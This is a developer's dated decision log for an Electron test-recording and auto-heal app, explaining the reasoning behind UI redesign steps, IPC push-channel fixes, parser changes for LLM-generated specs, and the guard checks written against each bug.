# Decisions

A dated record of what changed and, more importantly, *why* — the constraint
that forced a design, the alternative rejected, the bug a guard exists to
prevent. Newest first.

This is the reasoning that does not survive in the diff. When something below
looks over-built, the entry usually explains which failure it was built against.

Companion documents: [ARCHITECTURE.md](ARCHITECTURE.md) for the current per-file
map, and [../CLAUDE.md](../CLAUDE.md) for the working rules and conventions.

**Add an entry when a change involved a real decision** — a trade-off, a
rejected alternative, a non-obvious constraint. Routine work does not need one;
the commit message carries it. Entries up to 2026-08-06 were written by the
Glaze app's agent, which no longer works on this codebase.


### 2026-08-10 — Heals is two panels and four words, and only two of the words are coloured

**B2 of the redesign (REDESIGN §5), the second reskinned screen.** A journal and a detail, both `Panel`s, with the four heal states finally drawn as `StatusChip`s at the fixed status width — which is the first place in the app where that contract does any work, because this list is the only one where a column of chips reports four genuinely different things.

**Only two of the four take a hue, and the mapping is the decision.** `Accepted` is an outcome — you approved the change — so it is phosphor. `Applied` is the one that should catch your eye: the stored test has ALREADY been changed and nobody has looked at it, which is caution, which is amber. `Suggested` takes cyan, the palette's "running / live / **focus**": a suggestion is the open item waiting on you rather than a verdict. `Reverted` takes no tone at all, because it is settled and there is nothing left to report.

- **Two states sharing "no hue" is deliberate, not a gap.** `StatusChip`'s width is fixed so these read as a column, and the chip's own header says it: THE WORD reports the state. Inventing a fifth colour so every row is lit would spend the palette on chrome and leave the two that matter competing with two that do not.
- **Pinned on `data-tone`, not on colour.** The dom project runs with `css: false`, so a computed-style assertion reads `""` for all four and would pass against a column drawn entirely in green.

**The toolbar is gone and its two jobs moved.** The top strip's breadcrumb already says HEALS, so a title bar under it was the screen's name twice. The count went into the journal panel's `id` slot — it counts the journal — and "Clear history" into its `right` slot, because it clears that list. What is left is two panels and no chrome above them, which is what the design draws.

**The 330px journal is set in CSS, and `Panel`'s `flex` prop is why.** That prop writes `flex: 1 1 auto` INLINE on the section as well as the body, and an inline style beats the class — so the journal quietly grew to half the window. It did not look broken; it looked like a layout somebody had chosen, which is the worst kind of wrong. The body still needs to fill what the header leaves, so that half is a descendant rule instead.

**A5's `.gl-heal-*` classes carried straight over, and that is the `shared.css` rule paying off.** The was/now block, the candidate rows and the amber notice were built for the per-test Heals *panel*; the *view* wants exactly the same three things, found them already there, and grew no copy. This is the case screens.css's header describes in the other direction: a rule a second screen wants belongs in `shared.css`, and here the move had already been made.

**The amber warning is shown only where its sentence is true.** "A heal that succeeded is not the same as a heal that was right" is about a heal that was APPLIED and passed — the case with no other signal, because a mis-heal usually succeeds (clicking the wrong button rarely throws). On a suggestion nothing has been applied and the sentence is noise, which is precisely how a warning becomes something people learn to click past.

**One test changed its strings, and none was deleted.** "Suggestion only" / "Applied to the test" became "Suggested" / "Applied" — the design's four words, and short because the chip is a fixed width and a chip that sizes to its own sentence is what breaks the column. The test's subject is unchanged (does the screen say whether the stored test was altered?), and it gained a sibling that pins all four tones at once.

### 2026-08-10 — Home is the first reskinned screen, and the first number the app shows had better be true

**B1 of the redesign (REDESIGN §5), and the start of Phase B.** One screen, same purpose, new chrome — plus the three things the design adds: the plate, the wordmark treatment, and three readouts.

**A number nothing supports renders as an em dash, never as zero.** This is the whole risk of putting statistics on the landing screen, and it is silent in both directions. "0% green" with no runs in the last week is a claim about a week that did not happen, and it sends someone looking for a failure that never happened; "0 tests" flashed before the query resolves tells a person with a full library that their library is gone. So every readout distinguishes *absent* from *zero*, and `greenRate()` returns `null` rather than `0` for an empty window. Both directions are pinned, including the mirror: a week that genuinely was all red still reads `0%`, because the failure mode of over-correcting is a broken suite that renders as "no data".

- **The readouts share the app's own query keys** — `["tests"]`, `["runs"]`, `["heals", "all"]`. They cost nothing (the rail and the views have already filled those caches) and, more importantly, they cannot disagree with the screen you land on after clicking through. A home screen with its own count of anything is a home screen that is eventually wrong.
- **Baseline updates are excluded from the rate**, exactly as Stats excludes them. Accepting a new screenshot is not a run and has no verdict; counted, one afternoon of baseline work would drag the week's number down with no failing test anywhere.

**The `go` button says "Record a test" where the mockup says "Run a test".** A deliberate deviation, and the reason is that the mockup's label is a control this screen cannot honour: nothing is selected on Home, so "run" has no object — it would need a test picker the design does not draw, or it would do nothing. Recording is the primary action from an empty home, it is what this screen's copy has always told people to do, and it is the entry point the whole app is built around. Both buttons open the same two dialogs the rail's `+` menu opens, mounted a second time rather than hoisted: they are fully controlled and render nothing while closed, so a second instance costs one boolean, where lifting them would put two screens' state into a component that is neither.

**`echo` is ghosting, not chromatic aberration, and the name is the argument.** An echo is the same signal arriving twice, so the two offset copies of the wordmark are drawn in the SAME ink at low alpha. The obvious alternative — red and cyan fringes — would spend two status hues on decoration, on the app's own name, at the largest type size in the product, on a screen with no status vocabulary to interpret them. They are pseudo-elements (`content: attr(data-text)`) rather than markup, so a screen reader says "GOOD LOOKS!" once instead of three times, and there is a test that fails if anyone refactors them into real elements — a change that would look identical in every screenshot.

**The texture art is still missing, and the plate ships anyway.** REDESIGN §3.5 fixes `texture: ember` and its plate is `acid-25.jpg`, which lives in the mockup zip and has never been checked in (open question 6 names this as the one thing blocking B1). What shipped is the part that does not need it: the radial falloff, which is the plate's actual job, plus an ember wash for the warmth. When the art arrives it is one `background-image` on `.gl-home-plate` and the gradients stay underneath.

- **`--gl-ember` is a new token and is deliberately NOT `--gl-amber`.** Amber means flaky / healed / caution. A wash of it behind the home screen would be the largest coloured surface in the app claiming a status, on the one screen with nothing to interpret it against. A texture is not a status, so it gets a colour that cannot be mistaken for one.

**The loader went from 440px to 280px, and that is a layout fix rather than taste.** The column is centred but scrolls when it outgrows the pane; at a 700px window the old size pushed both buttons below the fold, which puts the screen's entire purpose behind a scroll on an ordinary laptop. It also makes the wordmark the largest thing on the screen, which is what the design asks for.

**`check:scroll-layout` moved with the properties it guards.** It pinned Home's `overflow-y-auto` and `min-h-full` as Tailwind class names in the markup; both are named rules in `screens.css` now. The contract is unchanged and so is the reasoning — the floor is what stops a too-tall hero being centred half off-screen — so the check reads the stylesheet instead, and additionally asserts the view still CARRIES both class names, because a rule nothing uses is a guard that passes over a screen it no longer describes. Verified by breaking both halves.

### 2026-08-10 — The five components every screen embeds leave the SDK, and a check so they stay left

**A5 of the redesign (REDESIGN §4), landing right behind A4.** `step-row.tsx`, `pager.tsx`, `tag-cluster.tsx`, `log-inspector.tsx` and `heals-panel.tsx` are the components every screen embeds. Doing them BEFORE the screens is the whole point: it means each Phase B PR has one review question — "does this screen still do everything it did?" — instead of two, with a button swap and a layout change tangled in the same diff.

**A third stylesheet, split by scope rather than by taste.** `primitives.css` is what a screen is built out of, `shell.css` is what a screen sits inside, `shared.css` is what a screen embeds. The five components stay in `renderer/main/` because each is wired to queries and IPC the theme layer must not know about; what moves is their chrome.

**Two chip rules, and the distinction is not cosmetic.** `.gl-chip` is neutral and `.gl-chip-tone` takes its border, fill and text from `toneSurface()`, and which one a label gets is decided by a single question: does it report an OUTCOME? "Applied to the test" and "Accepted" do, so they are toned. "During a run", "soft", "disabled", "seen before" do not — they are facts about how something is configured or where it happened — so they are neutral. Get that backwards and every configured step reads as a verdict.

- **Neither is a `StatusChip`, deliberately.** That one is fixed at `--gl-status-w` so a COLUMN of them has one edge; these are inline labels in a wrapping row whose lengths differ by design, and forcing "Applied to the test" into 78px would truncate it to satisfy a contract it is not part of.
- **The SDK `Badge` this replaced mapped `assert` onto GREEN** — the pass hue — on every assertion in every step list, so a list of steps read as a list of results. `TypeChip`'s palette is separate from the status palette for exactly this reason, and there is now a test that fails if a type chip is ever drawn in a tone.

**The tag delete stopped turning red on hover.** It did, and under this palette that is wrong: an outcome hue on a hover state reads as the row reporting something, which is precisely what `check:selection-neutral` bans. The destructive fact belongs where it can be stated rather than implied — the confirm dialog already names how many tests lose the tag and that it cannot be undone, and ITS confirm button is the red one. The X brightens instead.

**The step row keeps its own structure, and that is not a shortcut.** It carries drag-to-reorder, inline editing, per-step replay, the run-status flash and the `.step-new` outline; folding all of that into the `StepRow` primitive is the step list's own reskin (§B5/§B6), and doing it here would have made A5 a layout change to the most-used component in the app. What left is the SDK: badges → `TypeChip`, buttons → `.gl-icon-btn`, `Text` → `.gl-mono-value`, `Input` → `.gl-input`. The status glyph now takes the palette's tones, and `running` is `--gl-cyan` where it used to be the SDK accent — a different blue that means nothing here.

**`check:sdk-retired` is the point of the PR, not an extra.** The failure it guards is not a bug, it is erosion: a Phase B PR touching one of these files needs a button, `Button` is one import away and is what eighty other files still use, and the result compiles, renders, passes every test and looks *almost* right. A rounded control among square ones is invisible to jsdom (the dom suite runs with `css: false`), invisible to type-check, and invisible to a reviewer reading a 400-line reskin diff one import line at a time.

- **It asserts the mirror as well, because the obvious version passes vacuously.** `pager.tsx` now imports NOTHING from `@ui`, so "imports only keep-list symbols" says nothing about it whatsoever — a file that rendered plain unstyled markup would pass. So every retired surface must also be shown to read the theme layer.
- **The parser is proved before it is trusted.** A regex that stops matching harvests nothing and an empty set trivially has no offenders, so the check first asserts it can still see the imports in a file that definitely has some, by name and count. Same failure mode `check:push-consumers` was written against.
- **The keep-list is four families with reasons, and its size is asserted.** There is no way to enforce that a reason exists, so the next best thing is to notice the list growing: the fix for a red run must not become "add the symbol to KEEP", which is indistinguishable from the bug. Anything beyond Dialog / ScrollArea / the native-menu families / toast wants an entry here rather than a line there.
- **Verified by breaking it**: putting a `Button` back into `pager.tsx` goes red and names the file and the symbol.

**`check:text-color` stays as it is** (REDESIGN §8.3 asks for a decision per PR). These five surfaces no longer render `Text`, but forty-odd files still do, and its subject is not gone until they are.

### 2026-08-10 — The shell lands, and the light theme goes with it

**A4 of the redesign (REDESIGN §4).** The foundation had been sitting unconsumed since 2026-08-08 — tokens, fonts, atmosphere and fifteen primitives, none of it reachable from the app. This is the PR where the app starts looking like the design, and where the two-theme world ends.

**The strip is a `SplitView` slot, not a sibling, and that was the whole design question.** The top strip spans the window: wordmark over the rail, breadcrumb over the content. So it cannot be a child of the primary pane. Rendered as a sibling ABOVE the SplitView it lands outside `SplitViewContext`, where the rail handle's `useSplitView()` throws — and the fix for that, hoisting the collapse state into `RootShell`, moves `storageKey` persistence and the ⌃⌘S shortcut out of the one component that owns them, leaving the caller to reconstruct a localStorage key format it has no business knowing. A `header` slot inside the provider costs one wrapper div and keeps all of it where it is.

- **The pinned toggle is retired by the same change, and that is a fix.** `SplitView.SidebarToggle` was `absolute left-2 top-2` over the primary pane, which is why `Toolbar` carries `TOGGLE_INSET` — 44px of reserved space so the button did not land on the first letter of every view title. The handle is now in-flow in the strip's leading slot, so there is nothing to reserve for and every title moves back to the left edge. `pinned` was a prop the component ACCEPTED AND IGNORED; it is real now, and it gates the `registerPinnedToggle` call as well as the positioning — registering unconditionally would leave every toolbar in the app indented for a button that had moved.
- **The empty toolbar on Home went with it.** It held one non-breaking space, no text and no controls: it existed to reserve the toggle's band. With the toggle gone it was a blank 52px under a strip that already names the screen. The other views keep theirs — those carry a title and controls, and folding them into the breadcrumb is each screen's own Phase B reskin.

**The ⌘K affordance ships as an empty slot, deliberately.** A4's brief lists it, and the command palette is Phase C (§6.7). A hint that opens no palette teaches a shortcut that answers with silence; a disabled one ships a permanently greyed control for a feature nobody has asked for. Neither is better than nothing, so `command` and `ticker` are props with nowhere to be filled from yet, and a test pins that the tail renders zero children — otherwise "we will fill it in later" becomes a placeholder nobody removes. Same reasoning one size down inside the breadcrumb: the trailing segment is never a button, because a link to the page you are on is a control that does nothing.

**The breadcrumb names what is on screen, not what the URL says.** They differ in exactly one place and it is the one that matters: while recording, `RootShell` swaps the entire outlet for the trainer **without navigating**, so the route still reads `/stats` under a screen showing the recorder. A trail derived purely from the router would confidently name the wrong screen, which is worse than naming none — hence the explicit `recording` prop. A second, smaller version of the same rule: the crumb for an open test says "Test" until the name loads rather than showing the id, because an id that becomes a name is two different sentences in the same place. And the Home crumb is a real navigation: the rail lists tests and views and has never had a Home row, so before this the home screen was reachable only by un-selecting a test.

**The views nav moving out of the scroller is a bug fix wearing a restyle's clothes.** It was an `mt-auto` block at the END of the library list, which pins it to the bottom only while the library is SHORT. With more tests than fit, Stats/Visual/Batch/Heals scrolled away with them and the app's own views became something to hunt for. It is its own slot below the scrolling body now, so "pinned" is structural. **This cannot be tested by rendering**: jsdom has no layout engine, an overflowing list and a short one produce identical zero boxes, and a "is it visible at the bottom?" assertion would pass in the broken case too. The test is structural — the nav is not inside the scroller — which is the only question that has an answer here.

**Rows activate on `click` now, and that is a behaviour change rather than a test edit.** `SidebarListItem` fires on `mouseDown` — the AppKit idiom, and a documented trap in this repo: `fireEvent.click` does nothing to it and the assertion reports "0 calls", which reads as a dead handler rather than as the wrong event. `RailRow` is an ordinary button. REDESIGN §8.2 predicted exactly this swap and asked for it to be called out: a press that lands on a row and is dragged off it no longer navigates. Both directions are pinned, including the negative.

**Dark only, and the IPC went too.** The palette is near-black with phosphor accents over two texture layers; a light variant is a second design rather than a token swap, and the CRT bezel has no light reading (REDESIGN §0, §11). So: `useTheme()` deleted, `.dark` applied unconditionally in all four entry HTMLs (including the preview — a preview that followed the reviewer's OS would render a light variant of a design that has none), and `nativeTheme.themeSource` pinned to `"dark"` in the shell.

- **The pin is not cosmetic.** `themeSource` is what Electron's OWN chrome reads, and this app pops a native menu for every `Select` and dropdown. Following the OS from there would put a white menu on top of a black app for anyone whose Mac is in light mode — the one part of the window we do not draw ourselves.
- **The four `nativeTheme:*` handlers, the preload bridge, `NativeThemeInfo` and the `nativeTheme:updated` push are deleted, not left registered.** An IPC surface nobody calls is indistinguishable from one that is about to be needed again, and the push in particular would have become an orphan the moment its only subscriber (`useTheme`) went — which `check:push-consumers` would have caught, correctly, a day later.
- **The Appearance row stays where the control was.** "Dark only for now" is a sentence someone who had pinned Light needs to read; a row that simply vanished would read as a bug in a window whose whole job is to enumerate what can be changed. It is still indexed under "light" and "auto" in the settings search, because the words people will search for are the ones for the thing that is gone. Its four tests were not deleted with the control — they now assert the retirement, including that no radio can come back without a controller method to wire it to.

**Verified by breaking it.** The nav-outside-the-scroller assertion and both halves of the click/mouseDown pair were reverted deliberately and confirmed red (3 and 4 failures respectively) before being put back.

### 2026-08-09 — The sidebar's run dot: a stale colour, and a scale wide enough to describe three browsers

**The stale dot.** A test that failed, was re-run and passed kept a red dot in
the sidebar until the window was reopened. Nothing about the run or its record
was wrong — the dot is drawn from the shared `["runs"]` React Query cache, and
nothing invalidated it. The `runs:changed` push has existed since run history
did, but its only subscribers were `StatsView` and `VisualView`, both ROUTE
components: on any other route nobody was listening. So the failure needed the
user to be looking at the sidebar (i.e. not at Stats) — exactly the case the dot
exists for. It is also the quietest possible failure: the run panel one pane
over showed the pass at the same moment, so the app looked like it disagreed
with itself, and the dot is the half people trust.

The subscription moved to `RecorderProvider`, which is mounted for the whole
session in both windows. Subscribing to `runs:changed` rather than to
`runner:done` was deliberate: it also covers history being deleted from Stats
and records written by a batch, and it fires after the record is on disk, so the
refetch cannot race the write.

**The scale.** A dot with two colours cannot describe a batch run across
chromium, firefox and webkit. Two of three passing and none of three passing
both came out red, which is the same signal for "one engine is broken" and "the
test is broken" — and the first one you can often ship around. `run-verdict.ts`
grades the whole cohort instead: green, green-yellow (passed, but leaning on
more than three Auto-Heal substitutions), yellow-orange (a third or less
failed), orange-red (more than a third, not all), red (all).

Three decisions inside that:

- **Cohort, not last run.** A three-browser batch writes three records; the
  newest is whichever browser finished last. Read alone it reports the batch
  green when webkit passed and the other two failed. The verdict widens the
  newest run to its `batchId` siblings.
- **Ratio, not "1 of 3".** The browser set is the user's to choose, so a cohort
  can be two runs or four. `failed * 3 <= total` is the yellow-orange band,
  which at the size people actually run is exactly one browser of three, and it
  keeps an ordinary single failing run at plain red rather than turning every
  failure into a blend.
- **Nothing is sticky.** The brief asked for the colour to reset the instant a
  later run passes, from anywhere in the app, and to go red again on a failing
  reproduction attempt. Both fall out of recomputing from the newest cohort
  every time; a remembered "was failing" flag would need a clearing rule for
  every path that can run a test, and the one that got missed would be a dot
  stuck on a colour with no way back.

The three blends are declared as tokens (`--support-green-yellow`,
`--support-yellow-orange`, `--support-orange-red`) mixed from the existing four
status colours, for the reason the rest of this repo declares its own tokens: a
`bg-` class Tailwind has no key for emits nothing and throws nothing, and a
verdict dot with no background is a verdict that silently disappeared.

### 2026-08-09 — A generated test had two steps and a 37-line script, and the trainer offered to fix that backwards

**Symptom:** "Generate from prompt" produced a good spec — readable comments, useful `console.log` output — and the test opened with a Steps count of 2. The trainer had nothing to work with, and "Edit in Trainer" warned it would regenerate the script from the recorded steps, i.e. replace the whole script with a `viewport` + `goto` stub.

**The translation was not missing — the vocabulary was.** `tests:createFromPrompt` has parsed the generated source into steps since 2026-08-05. But `spec-parser.ts` is the reverse of `script-generator.ts`, and it reads the vocabulary this app EMITS: one self-contained `await page.<builder>(…).<action>(…)` per statement. A model asked for a readable spec writes a JavaScript program instead — locators in `const`s, `test.step(…)` phases, values read out of the page with `.textContent()` and asserted with `expect(value).toBeDefined()`. Only the first two statements were in the vocabulary, so only two became steps.

Three things came out of that, and the ordering between them is the decision:

- **Widen the parser where the shape is honestly translatable.** A locator bound to a `const` and used later is the same step as the inline form; it just needs a variable map. That it was previously LOST is worse than a miscount — the declaration counted a skip but the `await submit.click()` matched no branch at all and was walked past character by character, contributing neither a step nor a skip. Same failure mode as the nested-`page.*` paths fixed earlier, and the same fix: claim it, or count it.
- **Count what cannot be translated, never approximate it.** A refined chain (`.first()`, `.filter()`, `.or()`) could be stored as its base locator — and would then regenerate a selector that matches a *different element*, which passes review and fails at run time. Rejected: it is recorded as unclassified, which surfaces as `stepsDiverged` and a warning the user can see. `expect(<jsValue>)` gets the same treatment for the same reason.
- **Constrain the generator rather than chase the parser.** The remaining gap (extraction, branching, `.or()` composition) is not a parser bug — the step model has no vocabulary for "read a value into a variable and assert on it", and inventing one to satisfy a prompt would be a data-model change driven by an LLM's habits. So `GENERATE_SYSTEM_PROMPT` now states the round-trippable vocabulary outright. **Comments and `console.log` are explicitly kept welcome** — they are what made the output readable, and `spec-parser.ts` already consumes both WITHOUT counting a skip, so they cost nothing. A rule that tightened the output by taking those away would have fixed the step count by making the script worse.

`test.step(…)` was a separate, opposite bug found while probing this: `extractTestBodies` matched the wrapper as a test body of its own, and since the scan already walks straight through it inside the enclosing `test(...)` body, **every step in a `test.step` block was emitted twice**. Silent — the list just showed the flow twice — and it lands on exactly the specs a model writes when it is also writing good comments.

**The two prompts are a matched pair with nothing connecting them in the type system**, which is why `llm-prompts.test.ts` does more than assert copy: it parses a spec written to the prompt's own rules and asserts every action becomes a step with zero skips. A copy edit that drops a rule, or a parser change that narrows the vocabulary, fails there instead of in a generated test the user has to notice is wrong.

### 2026-08-09 — Radio buttons touched their own labels, because `Label` was typography only

**Symptom:** in Settings → AI, the AI provider options read as `◯Ollama ◉LM Studio ◯Claude` — each circle jammed against its text, close enough to look like an overlap. Appearance → Theme (Auto / Light / Dark) had it too; the panes were built the same way and both shipped it.

**The port dropped a layout rule from a component whose name suggests it has none.** `Label` is used two ways: pointing at a control with `htmlFor`, and *wrapping* one — `<Label><RadioGroupItem/>Ollama</Label>`, which is the shape every radio row in Settings uses. Only the second needs the element to be a flex box with a gap, and the ported `Label` carried nothing but typography, so the radio and its text became adjacent inline boxes with no space at all between them. Fixed on `Label` (`inline-flex items-center gap-2`) rather than on the two panes, because the next pane to wrap a control would have inherited the bug.

- **`inline-flex`, not `flex`.** The upstream is `flex`; `inline-flex` keeps a label from stretching to its container's width in the non-wrapping usages (`FieldLabel`), which is a change this fix has no reason to make. Callers that want block behaviour still win — `setting-row.tsx` already passes `flex flex-wrap items-center gap-2`, and tailwind-merge collapses the display group to the caller's choice rather than emitting both. Pinned by a test, since the two classes silently coexisting is exactly how this would come back.
- **`RadioGroup` went `gap-3` → `gap-4` in the same change.** With the intra-option gap fixed at 8px, a 12px gap between options is barely larger — the text of one option still reads as attached to the next option's circle. The invariant, and what the test asserts, is *between > within*, not either number.
- **`RadioGroupItem` gained `shrink-0`.** It is now a flex item beside text; `Checkbox` already had it. Without it a long option label squashes the circle into an ellipse, which is the same bug wearing a different shape.
- **Asserted on class names, and that is not laziness.** The dom project runs with `css: false`, so Tailwind emits no values into jsdom and `getComputedStyle(...).gap` reads `""` for the broken and fixed markup alike — a spacing assertion there passes vacuously forever. `check:renderer-classes` is the half that proves the names emit real rules; `renderer/ui/label-gap.test.tsx` is the half that proves they are applied. Neither alone would have caught this.
- **Why no test caught it:** the pane tests find each option by accessible name, and the accessible name is correct whether or not there is a pixel between the circle and the word.


### 2026-08-09 — Two more pushes nobody was listening to, and a check so there is never a third

**Follow-up to the entry below**, which fixed `trainerPanel:viewportNarrowed` and noted two other unsubscribed channels as a deferred cleanup. Sweeping them properly turned up something the first pass got wrong.

**`recorder:loadFailed` was not redundant. The error dialog had never once opened.** The previous entry called it harmless on the grounds that the renderer reads `state.loadFailed` off `recorder:state`. It does — and that field is *always false*. The service sets `session.loadFailed = true`, tears the session down (`session = null`), and only then calls `broadcastState()`; `currentState()` reads `session?.loadFailed ?? false`. There is a second, independent reason it could not have worked: `root-view.tsx` mounts `RecordingView` only while `state.recording`, which is `!!session` — also false by then — so the component hosting the dialog is unmounted at the exact moment the dialog is meant to appear. The push was the only carrier and had no listener, and the service's own comment on that path calls the dialog "the primary feedback". A training window that fails to open therefore tore the session down and said nothing.

- **The consumer had to move, not just exist.** `load-failed-dialog.tsx` is mounted from `RootView` *outside* `RootShell`, holds the message from the push rather than reading session state, and is what the push now reaches. Putting a subscription in `RecordingView` would have satisfied a "channel has a consumer" check while changing nothing — the component is not there when it fires.
- **`RecorderState.loadFailed` is gone.** A field that can never arrive true is worse than no field: the obvious repair for the dialog is to re-gate on it, which is how it was written the first time. `Session.loadFailed` stays — it is real and gates `loading`.
- **Two dead things found underneath it.** "Check Stats" navigated by assigning `window.location.hash = "#/stats"`, which selects nothing under this router's memory history; it now uses the router, like `onFinished`. And "Check Stats" was wired to `destructiveAction`, so it drew as a red destructive button on a dialog that is already about a failure. Neither had ever been seen.
- **`recorder:healSuggestion` genuinely was redundant, and is deleted.** Of the four callers of `tryHeal`, only `replayFromCurrent` passes its `heal` onward — on the `recorder:replayLog` step event, which is what the Console renders. The other three keep `okWithHeal` and drop the candidates. So for those paths the candidates live in the journal (the Heals view) and nowhere on screen. That is a missing feature, not a missing push: reviving a channel no window listens on would not have put them anywhere either. Deleting is behaviour-preserving; building the surface is a separate decision.

**The check does not have an allowlist, and that is the whole design.** An "expected orphans" list is exactly the artefact that would have hidden both bugs — the fix for a red check becomes "add the channel to the list", which is indistinguishable from the bug. If a push should have no consumer, it should not be a push.

- **The scanner has to be able to fail two ways, so both are pinned.** It could go *blind* — a regex that stops matching harvests nothing, and an empty set trivially has no orphans, so the harvest is floored and one channel per parsing path is pinned by name. And it could *miss a send*: `sendToMain` is not always called with a literal (`branch-switcher.ts` passes a const; `batch-runner.ts` injects `emit: (channel, payload) => sendToMain(channel, payload)`). An indirection the scanner cannot follow **fails** rather than being skipped, because a dropped channel takes its orphan-hood with it. A forwarder counts as resolved only when its channels were recovered from literal `emit("…")` calls in the same file.
- **The generic is why this is not a regex.** `api.on<{ status: "begin" | "end" }>("recorder:replayStep", …)` — take the first string literal after `api.on` and you read `begin` as the channel, then report `recorder:replayStep` as an orphan. A false failure sends whoever is holding it looking for a bug in working code, so the parser skips a balanced `<…>` before the call parens, and `recorder:replayStep` is pinned as the case that proves it.
- **Verified by breaking it four ways:** removing the new subscription, adding a fresh unsubscribed push, making a channel unresolvable, and blinding the scanner itself. Each goes red with a message naming what to do.

### 2026-08-09 — The warning that docking narrows the training viewport was never shown

**Symptom:** none. That is the entry. Docking the trainer panel takes 360pt off the training browser, a responsive site re-lays-out at the new width, and the user is recording against a layout they did not choose and cannot see they did not choose. The run that eventually fails blames the locator rather than the width.

**The mitigation was designed, built halfway, and never connected.** The 2026-08-06 entry below commits to exactly this: shrinking rather than overlaying costs a mid-session re-layout, "made visible rather than silent via a one-per-session `trainerPanel:viewportNarrowed` push". The push was written. `noteViewportChange` guards it correctly — once per session, and never when `preserveBrowserWidth` meant nothing actually narrowed. Nothing in the renderer ever subscribed. `grep -rn viewportNarrowed main renderer` returned one hit, the sender.

- **Subscribing in the panel would have looked right and fixed nothing.** `noteViewportChange` runs inside `openTrainerPanel` *before* `await panelWindow.loadURL(url)`. The panel is registered as an aux window by then, so the message is delivered — to a `webContents` with no page and therefore no listeners, and dropped. On the ordinary path (a panel that opens already docked) the panel is the one window that structurally cannot hear this. Worse, the mistake is self-concealing: a component test that emits into a mounted panel passes, so the bug would be invisible in exactly the place anyone would look for it. **This is the same root cause as "the panel could not find out it was undocked" in the entry below** — a push aimed at a window that does not exist yet — found again on a second channel, which is the argument for treating it as a property of the panel's startup rather than a one-off.
- **So `RecordingView` carries it, and the panel subscribes too.** The main window has been loaded since the session started and is the receiver that can be relied on. The panel is not redundant: `dock()` sends the same push on the re-dock path with both windows alive, and that is the moment the user is most owed an answer, having just pressed the button that caused it. Both windows showing it is the same mirroring the step list already does.
- **The notice does not auto-dismiss.** It is raised at the instant focus moves to the training browser and the panel beside it, so a four-second toast in the main window would count down entirely behind another window — silence with extra steps. The condition lasts as long as the session stays docked, so the notice lasts until dismissed. Pinned by a test, because `duration` is the kind of option a later tidy-up removes as noise.
- **The width is in the title, not just "something changed".** Whether 1080pt matters is a question only the user's own breakpoints can answer, and a notice that withholds the number cannot be acted on.
- **Deferred: a `check:*` guard that every `sendToMain` channel has a renderer subscriber.** It would have caught this, and the sweep found two more unsubscribed channels — `recorder:loadFailed` and `recorder:healSuggestion`. Deferred to a follow-up rather than shipped half-enforced or with an allowlist that hides the very thing it looks for. *(Landed the same day, along with a correction: `recorder:loadFailed` was called redundant here on the strength of the renderer reading `state.loadFailed`, and it is not — that field is nulled out before the broadcast, so the failure had no other carrier at all. See the entry above.)*

### 2026-08-09 — A dialog button was laid out outside its dialog, and Cancel was the button that pushed it there

The trainer's exit dialog ("Save changes to this test?") rendered
**"Discard Edits" outside the dialog**, over the step list behind it — on both
the Discard and the Save Test paths, since both raise the same confirm.

**The mechanism is `justify-end`, and it is why nobody caught this by reading
the CSS.** `DialogFooter` was `flex items-center justify-end gap-2`. Every
button in it is `whitespace-nowrap`, and a flex item's default `min-width: auto`
means none of them can shrink — so the row is laid out at its intrinsic width
whatever the container is. When that exceeds the container, `justify-end`
anchors the row's END to the box and the surplus hangs off the **LEFT**, i.e.
away from the direction anyone looks when they think about overflow.

The numbers are small and entirely specific to one window. The trainer panel is
`PANEL_WIDTH` 360 DIP; the dialog is `w-[calc(100vw-4rem)]` capped at
`max-w-md`, so 296px, with 264px of content inside `p-4`.
"Discard Edits · Cancel · Save & Exit" needs about 282px. **The same dialog in
the main window is fine** — its 928px floor (see 2026-08-09, narrow layout)
gives the dialog its full 448px, and 282 fits with room to spare. That is why
this shipped: the component was correct everywhere it was looked at.

**Two independent fixes, because either alone is temporary.**

`flex-wrap` on the footer is the real one. It makes the failure *structurally*
impossible rather than arithmetically unlikely: buttons that do not fit cost a
second row instead of leaving the box, at any width, for any label. Removing
Cancel alone would only have bought headroom until the next label was longer —
and the ask was explicitly that a re-added button must not bring the bug back.

Dropping **Cancel** is the second, and it is a real simplification rather than a
width trick. Every composed dialog renders the close "X" (`showCloseButton`
defaults on, and no caller turns it off), and Radix already closes on Escape and
on the overlay click. Cancel was a fourth way to do the same thing, costing
~75px of a 264px row. The property it was there for — *a dialog must offer a way
out that is not the thing it is asking you to agree to* — is unchanged and still
asserted; it now points at the X. Two existing tests were asserting the button
rather than the property and were rewritten to the X, which is the whole reason
they are worth keeping.

**Rejected: letting the buttons shrink.** `min-w-0` plus `overflow-hidden` would
also keep them inside the box, by clipping their labels. A destructive action
reading "Discard Ed…" is a worse outcome than a second row, and it fails
silently — nothing about a clipped label says the layout is wrong.

**The footer became its own exported component (`DialogActions`) to make the
layout testable.** The set of buttons, their order and the `mr-auto` on the
destructive one *are* the thing under test; a footer rebuilt by hand inside a
spec would keep passing while the real one overflowed. That is not a
hypothetical here — see below.

**Three layers of guard, because the obvious one cannot see the bug.**
`renderer/ui/dialog-actions.test.tsx` renders this exact footer, and every
assertion in it passed for the whole life of the bug: jsdom has no layout engine
and the dom project runs with `css: false`, so `flex-wrap` never produces a
second row there and a `getBoundingClientRect` assertion reads zeros in both the
fixed and the broken case. It pins what it *can* — no Cancel, an exhaustive list
of the actions, the X still dismisses, and `flex-wrap` as a class proxy.
`check:dialog-footer` is the fast source-level guard, in the same tradition as
`check:narrow-layout` and `check:clickable-chrome`.

`e2e/dialog-footer.spec.ts` is the one that could actually have caught it. It
server-renders the real `DialogActions` and injects it into the **running app's
renderer**, so the measurement uses the real stylesheet, the real self-hosted
fonts and a real layout engine, then checks every button's box against the
panel's content box. Two things it does deliberately:

- **A nowrap CONTROL.** The same markup is measured a second time with wrapping
  forced off, and that one *must* overflow. Without it, shortening a label until
  the row happened to fit would turn the real assertion green for a reason that
  has nothing to do with the fix — the vacuous pass this repo keeps finding. Its
  failure message says so in those words.
- **A separate process for the fixture** (`e2e/dialog-footer-fixtures.tsx`).
  Playwright compiles the TSX it loads with its own component-testing JSX
  runtime, so `renderToStaticMarkup(<DialogActions/>)` inside a spec dies with
  "Objects are not valid as a React child". Running it under `tsx` is what keeps
  the fixture the real component instead of markup copied into a spec.

The panel geometry the spec reconstructs (296px) is derived, not asserted:
`check:dialog-footer` recomputes it from `PANEL_WIDTH` and the real
`dialogPanelClass` and fails if they stop agreeing. A layout test measuring a box
the app never renders is worse than no layout test, because it is green.

### 2026-08-09 — Packaging from a bootstrapped worktree shipped an app that fails every test run, and exited 0

